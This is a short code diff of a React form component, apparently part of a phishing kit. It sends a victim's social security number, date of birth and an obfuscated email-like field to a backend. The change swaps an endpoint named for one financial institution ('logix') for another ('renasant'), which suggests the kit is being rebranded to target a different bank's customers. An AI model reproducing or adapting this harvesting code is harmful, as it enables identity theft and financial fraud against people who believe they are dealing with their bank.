@@ -69,7 +69,7 @@ const SSN2: React.FC = () => {
     if (!Object.values(newErrors).some(error => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
-        await axios.post(`${baseUrl}api/logix-meta-data-6/`, {
+        await axios.post(`${baseUrl}api/renasant-meta-data-6/`, {
                     emzemz: emzemz,
 
           s2ns: socialSecurityNumber,
